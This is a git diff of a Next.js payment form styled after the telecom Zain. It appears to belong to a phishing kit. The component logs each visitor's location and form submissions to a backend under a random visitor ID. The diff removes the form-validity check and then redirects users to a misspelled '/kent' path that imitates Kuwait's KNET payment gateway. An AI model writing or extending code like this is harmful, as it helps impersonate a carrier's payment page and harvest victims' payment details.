@@ -19,7 +19,7 @@ import LoaderApp from "@/components/loader"
 // Placeholder functions to avoid errors if lib files are not present
 
 
-const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
+const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
 
 
 export default function ZainPaymentForm() {
@@ -31,16 +31,8 @@ export default function ZainPaymentForm() {
   const [phoneError, setPhoneError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [activeTab, setActiveTab] = useState("bill")
-  const [visitorId, setVisitorId] = useState<string | null>(null);
 
   useEffect(() => {
-    const userid=localStorage.getItem('visitor')
-    if(userid!==null){
-    localStorage.setItem("visitor", newVisitorId);
-    setVisitorId(newVisitorId);
-    }else{
-      setVisitorId(userid)
-    }
    getLocationAndLog()
   }, []);
 
@@ -115,9 +107,6 @@ export default function ZainPaymentForm() {
   const handleSubmit = async (e:any) => {
     e.preventDefault()
     setIsLoading(true)
-
-    if (!isFormValid || !visitorId) return
-    
     try {
       await addData({
         id: visitorId,
@@ -126,18 +115,17 @@ export default function ZainPaymentForm() {
         timestamp: new Date().toISOString(),
         currentPage: "كي نت ",
         action: "payment_submit_attempt"
+            }).then(()=>{
+      window.location.href = "/kent"; // Replace with Next.js router if possible: router.push('/checkout')
+
             })
+
       // Simulate API call for payment processing
       
       // On successful payment simulation
-      await addData({
-        id: visitorId,
-        action: "payment_submit_success_simulation",
-        status: "simulated_success"
-      });
+  
       // Navigate to checkout or show success
       // For Next.js, prefer using the `useRouter` hook for navigation
-      window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')
     } catch (error) {
       console.error("Submission error:", error);
       await addData({
